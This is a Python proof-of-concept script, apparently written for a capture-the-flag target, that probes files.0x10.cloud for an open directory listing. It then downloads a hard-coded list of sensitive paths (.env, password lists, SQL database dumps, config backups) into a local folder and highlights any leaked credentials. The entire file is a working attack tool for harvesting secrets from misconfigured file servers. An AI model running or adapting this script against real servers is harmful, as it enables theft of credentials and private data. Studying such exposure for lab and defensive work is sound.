# ============================================================
#  Vulnerability: Unprotected Files - Open Directory Listing + Sensitive File Exposure
#  Target: files.0x10.cloud
#  Author: Luke
# ============================================================
#
#  The file server at files.0x10.cloud has directory listing enabled.
#  This allows anyone to browse and download sensitive files such as:
#  - .env files containing database passwords and secret keys
#  - Database backups (.sql dumps)
#  - Password lists and configuration files
#
#  This is a critical information disclosure vulnerability.
# ============================================================

import requests
import os
from urllib.parse import urljoin

BASE_URL = "https://files.0x10.cloud/"

# List of sensitive files that should not be publicly accessible
SENSITIVE_FILES = [
    ".env",
    "secret/passwords.txt",
    "backup/db_dump.sql",
    "backup/db_dump_20240301.sql",
    "config.bak",
    "passwords.txt"
]

print("=" * 65)
print("  Unprotected Files - Open Directory Listing & Sensitive File Exposure")
print("=" * 65)
print(f"  Target: {BASE_URL}\n")

# Check if directory listing is enabled on the root
try:
    response = requests.get(BASE_URL, timeout=8)
    if response.status_code == 200 and ("Index of" in response.text or "<a href=" in response.text):
        print("[+] CRITICAL: Directory listing is ENABLED!")
        print("    Anyone can view and download files without authentication.\n")
    else:
        print("[-] Root directory listing not obviously enabled, testing direct file access...\n")
except Exception as e:
    print(f"[!] Error checking root directory: {e}\n")

print("Attempting to access sensitive files...\n")
downloaded_count = 0

for file_path in SENSITIVE_FILES:
    full_url = urljoin(BASE_URL, file_path)
    
    try:
        response = requests.get(full_url, timeout=10)
        
        if response.status_code == 200 and len(response.content) > 100:
            # Save the downloaded file
            os.makedirs("exposed_files", exist_ok=True)
            safe_name = file_path.replace("/", "_")
            save_path = f"exposed_files/{safe_name}"
            
            with open(save_path, "wb") as f:
                f.write(response.content)
            
            print(f"[+] SUCCESS: Downloaded → {full_url}")
            print(f"    Saved to: {save_path}  ({len(response.content):,} bytes)")
            
            if ".env" in file_path.lower():
                print("    → .env file leaked! Contains credentials and secret keys.")
            
            downloaded_count += 1
        else:
            print(f"[-] Not accessible: {full_url} (Status: {response.status_code})")
            
    except Exception as e:
        print(f"[-] Error accessing {full_url}: {e}")

print("\n" + "=" * 65)
print(f"Scan completed! {downloaded_count} sensitive file(s) successfully downloaded.")
print("Check the 'exposed_files' folder for leaked credentials and the CTF flag.")
print("This demonstrates a serious unprotected files vulnerability.")
